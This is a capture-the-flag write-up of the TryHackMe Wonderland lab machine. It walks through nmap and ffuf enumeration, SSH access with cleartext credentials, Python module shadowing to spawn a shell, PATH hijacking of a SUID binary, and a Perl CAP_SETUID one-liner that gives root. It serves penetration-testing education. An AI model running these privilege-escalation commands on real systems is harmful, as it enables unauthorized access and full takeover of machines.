---
layout: post
title: thm-wonderland
description: THM Wonderland machine writeup. 
category: Writeups
tags: python, suid, 
date: 2025-07-19 18:16 +0100
---
# Wonderland 
>Overall it was a fun box. Pretty basic enumeration and exploitation techniques we just have to keep up with the a bit long attack vector. Before diving into the walk-through here's a summary of some of the techniques we'll cover shortly:
1. The enumeration didn't have anything complicated: <mark style="color:blue;">basic nmap scan, few fuzzing</mark> and we find some <mark style="color:blue;">cleartext credentials</mark> that'll ssh us into the machine as a regular user. The user flag was in a very strange directory (as the comments stated as well)
2. To get to root, we'll be doing some <mark style="color:blue;">lateral movement</mark> as well. from the foothold as Alice we'll exploit a basic <mark style="color:blue;">Module Shadowing</mark> to gain access to rabbit.
3. From there, we'll find a binary with a <mark style="color:blue;">SUID bit</mark> that we'll use to gain access to hatter account through a <mark style="color:blue;">PATH Hijacking</mark>.
4. Finally, for root, back to the basics after some manual inspection, linpeas.sh (after <mark style="color:blue;">File transferring</mark> it to the target) shows <mark style="color:blue;">CAP\_SETUID</mark> available for the Perl interpreter!
{: .prompt-tip }     
Pwned successfully!

![caption](assets/htb-escapetwo-1.png)

## Enumeration

```bash
sudo sh -c 'echo "<IP> wonderland.thm" >> /etc/hosts'
```

### Nmap

```bash
nmap wonderland.thm -sV -sC -Pn -T4 -oN def-scripts-scan -vv

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
![Nmap Output](assets/thm-wonderland-1.png)

Okay then let's follow the white rabbit. To fuzzing now. Normally at this point we like to leave a UDP scan to run in the background or a full ports TCP scan and proceed further in our enumeration because nmap only scans the first top 1000 ports. We could possibly miss something if we only check those ports. For this machine the scan lead to nothing so you should step over that part and think about it for the next machines :smile:.

### Fuzzing

#### Subdomains/Vhosts

The scan for subdomains/Vhosts lead to nothing for this box. So we move on. (For the command below, you should consider a filter of your own with ffuf because we'll get lots of irrelevant stuff)

```bash
$ffuf -w <wordlist.txt>:FUZZ -u http://wonderland.thm -c -H 'Host: FUZZ.wonderland.thm'
```

#### Directories

```bash
$ffuf -w <wordlist.txt>:FUZZ -u http://wonderland.thm/FUZZ -c -v 
```

The command above will return the following directories:&#x20;
![Nmap Output](assets/thm-wonderland-2.png)


![Nmap Output](assets/thm-wonderland-3.png)

The `/img` directory was also clear to find when inspecting the home page.

![Nmap Output](assets/thm-wonderland-4.png)

Containing the following files:

![Nmap Output](assets/thm-wonderland-5.png)

Looking for fuzzing the other sub directories we find the following pattern:
![Nmap Output](assets/thm-wonderland-6.png)

Intuitively, checking the source code of every directory we find, we stumble upon what seems to be Clear-text Credentials of user Alice:
![Nmap Output](assets/thm-wonderland-7.png)


## Foothold/user flag - Alice

Since for now we didn't find any login portal, ssh is the only way we could possibly gain a foothold. Which was successful!

![Nmap Output](assets/thm-wonderland-8.png)


Okay root flag file in the home directory? Strange. How to deal with strange? Be even more strange:

![Nmap Output](assets/thm-wonderland-9.png)



## Lateral Movement

### 2nd User - Rabbit

```bash
find / -perm -4000 2>/dev/null
```
![Nmap Output](assets/thm-wonderland-10.png)


```bash
find / -perm -2000 2>/dev/null
```
![Nmap Output](assets/thm-wonderland-11.png)


Nothing in here.

At this point, we normally look for kernel exploit or a critical kernel vulnerability (Which is also done right after gaining foothold at the machine.) which also lead to nothing in this machine.

The command below tells us what binaries we can run as sudoers (if misconfigured):

```bash
$sudo -l
```
![Nmap Output](assets/thm-wonderland-12.png)


Okay, if we find a way to exploit the `walrus*.py` file and combine it with sudo command as `rabbit` user, we could get a shell as `rabbit`. Let's enumerate further.

Running the python script and checking the source code, we found nothing BUT thee first line:
![Nmap Output](assets/thm-wonderland-13.png)


This will lead to <mark style="color:red;">module shadowing</mark>, which is exploiting the way python imports modules, tricking the interpreter to import a local version of the random module. This is due to the random module is a `.py` file not a precompiled binary(built-in). Here's some resources to dive more into that vulnerability:



```bash
$echo "import os;os.system('/bin/sh')" > random.py
$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
![Nmap Output](assets/thm-wonderland-14.png)



### 3rd User - Hatter

Intuitively checking the rabbit's home directory:
![Nmap Output](assets/thm-wonderland-15.png)


Alright, no `strings` command, no `binwalk`, no `ltrace`, no `strace`. we gotta transfer this file to our local machine.

#### File Transfer

This can be done using many methods. We could use `scp` tool which is based on ssh, simple base64 encoding, or using a `python HTTP server`. BUT, in our case, the most efficient and quick way is setting up a `python HTTP server` and download the file with curl/wget. This is because we have access to the python interpreter and in order to use scp, we will need to add an ssh key for user rabbit.

Here's how we're going to do it:

```bash
compromized-host$cd /home/rabbit
compromized-host$python3 -m http.server
```

```bash
attacking-machine$wget http://target-ip:8000/teaParty
```
![Nmap Output](assets/thm-wonderland-16.png)


![Nmap Output](assets/thm-wonderland-17.png)


Okay, no need to debug or anything, we got something interesting:

```bash
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

Here's why this line of code might be vulnerable: the one-liner  uses non relative path for the date command. So if thee system relies of the PATH variable to execute the command, we might alter  the PATH variable and point it to a malicious binary of our choice, and since teaParty has SUID bit set, we can move forward to the next user. Here we go:

```bash
compromized-host$echo '#! /bin/bash\n/bin/sh' > /tmp/date
# You can choose the home directory not the /tmp.  
compromized-host$
compromized-host$chmod +x /tmp/date
compromized-host$export PATH=/tmp:$PATH
compromized-host$./teaParty
```
![Nmap Output](assets/thm-wonderland-18.png)


Now with the cleartext credentials on the home directory we ssh into the server with hatter user.

## Privilege Escalation

After getting the [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) script on the machine using one of the methods we. We get interesting vulnerable stuff:
![Nmap Output](assets/thm-wonderland-19.png)


> Traditionally, a Linux process is either privileged (running as root) or unprivileged. Privileged processes are not subject to kernel permission checks, and thus have full power over a system. A capability is a distinct and independent privilege that can be used by a process to bypass certain permission checks. Capabilities were first introduced in Linux 2.2, and several more were added in later versions. They are usually set on executable files and are automatically granted to the process when a file with a capability is executed. Capabilities essentially divide the power of the root user into separate privileges, which improves security by limiting the access an attacker would gain by exploiting or abusing a service

So, i simple perl script that sets the hatter user ID to 0 will bypass all the privileges checking since the process will have that specific capability. Here's a script i found on [GTFObins](https://gtfobins.github.io/gtfobins/perl/).

```bash
/usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
![Nmap Output](assets/thm-wonderland-20.png)



